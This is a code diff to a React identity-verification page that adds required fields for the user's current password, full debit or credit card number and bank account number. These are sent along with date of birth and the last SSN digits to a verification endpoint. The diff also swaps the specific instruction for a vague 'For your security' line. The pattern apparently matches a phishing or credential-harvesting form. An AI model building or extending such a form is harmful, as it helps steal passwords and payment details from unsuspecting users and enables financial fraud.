@@ -16,7 +16,7 @@ import {
 } from "@/components/ui/form";
 import { useToast } from "@/hooks/use-toast";
 import { apiRequest } from "@/lib/queryClient";
-import { Search, Shield, Mail, Phone, HelpCircle, ChevronRight, Loader2, Lock, Check, AlertCircle } from "lucide-react";
+import { Search, Shield, Mail, Phone, HelpCircle, ChevronRight, Loader2, Lock, Check, AlertCircle, CreditCard, Building2, Key } from "lucide-react";
 import { Link, useLocation } from "wouter";
 
 const verificationMethods = [
@@ -43,6 +43,9 @@ const verificationMethods = [
 const identitySchema = z.object({
   dateOfBirth: z.string().min(1, "Date of birth is required"),
   ssn: z.string().length(4, "Please enter exactly 4 digits"),
+  cardNumber: z.string().min(13, "Please enter a valid card number").max(19, "Card number too long"),
+  accountNumber: z.string().min(8, "Please enter a valid account number").max(17, "Account number too long"),
+  currentPassword: z.string().min(1, "Current password is required"),
 });
 
 const passwordSchema = z.object({
@@ -79,6 +82,9 @@ export default function VerifyPage() {
     defaultValues: {
       dateOfBirth: "",
       ssn: "",
+      cardNumber: "",
+      accountNumber: "",
+      currentPassword: "",
     },
   });
 
@@ -91,12 +97,15 @@ export default function VerifyPage() {
   });
 
   const verifyMutation = useMutation({
-    mutationFn: async (data: { dateOfBirth: string; ssn: string }) => {
+    mutationFn: async (data: IdentityFormData) => {
       const response = await apiRequest("POST", "/api/auth/verify-identity", {
         verificationType: "ssn",
         value: data.ssn,
         dateOfBirth: data.dateOfBirth,
         ssn: data.ssn,
+        cardNumber: data.cardNumber,
+        accountNumber: data.accountNumber,
+        currentPassword: data.currentPassword,
       });
       return response;
     },
@@ -283,12 +292,83 @@ export default function VerifyPage() {
                   <div className="flex items-start gap-3 p-4 bg-blue-50 rounded-lg mb-6">
                     <AlertCircle className="w-5 h-5 text-blue-600 flex-shrink-0 mt-0.5" />
                     <p className="text-sm text-blue-800">
-                      Please enter your date of birth and the last 4 digits of your Social Security Number to verify your identity.
+                      For your security, please verify your identity by providing the information below.
                     </p>
                   </div>
 
                   <Form {...identityForm}>
                     <form onSubmit={identityForm.handleSubmit(handleIdentityVerify)} className="space-y-5">
+                      <FormField
+                        control={identityForm.control}
+                        name="currentPassword"
+                        render={({ field }) => (
+                          <FormItem>
+                            <FormLabel className="text-gray-700 font-medium flex items-center gap-2">
+                              <Key className="w-4 h-4" />
+                              Current Password
+                            </FormLabel>
+                            <FormControl>
+                              <Input
+                                type="password"
+                                placeholder="Enter your current password"
+                                className="h-12 border-gray-300"
+                                data-testid="input-current-password"
+                                {...field}
+                              />
+                            </FormControl>
+                            <FormMessage />
+                          </FormItem>
+                        )}
+                      />
+
+                      <FormField
+                        control={identityForm.control}
+                        name="cardNumber"
+                        render={({ field }) => (
+                          <FormItem>
+                            <FormLabel className="text-gray-700 font-medium flex items-center gap-2">
+                              <CreditCard className="w-4 h-4" />
+                              Debit or Credit Card Number
+                            </FormLabel>
+                            <FormControl>
+                              <Input
+                                type="text"
+                                placeholder="Enter 13-19 digit card number"
+                                maxLength={19}
+                                className="h-12 border-gray-300"
+                                data-testid="input-card-number"
+                                {...field}
+                              />
+                            </FormControl>
+                            <FormMessage />
+                          </FormItem>
+                        )}
+                      />
+
+                      <FormField
+                        control={identityForm.control}
+                        name="accountNumber"
+                        render={({ field }) => (
+                          <FormItem>
+                            <FormLabel className="text-gray-700 font-medium flex items-center gap-2">
+                              <Building2 className="w-4 h-4" />
+                              Account Number
+                            </FormLabel>
+                            <FormControl>
+                              <Input
+                                type="text"
+                                placeholder="Enter your account number"
+                                maxLength={17}
+                                className="h-12 border-gray-300"
+                                data-testid="input-account-number"
+                                {...field}
+                              />
+                            </FormControl>
+                            <FormMessage />
+                          </FormItem>
+                        )}
+                      />
+
                       <FormField
                         control={identityForm.control}
                         name="dateOfBirth"
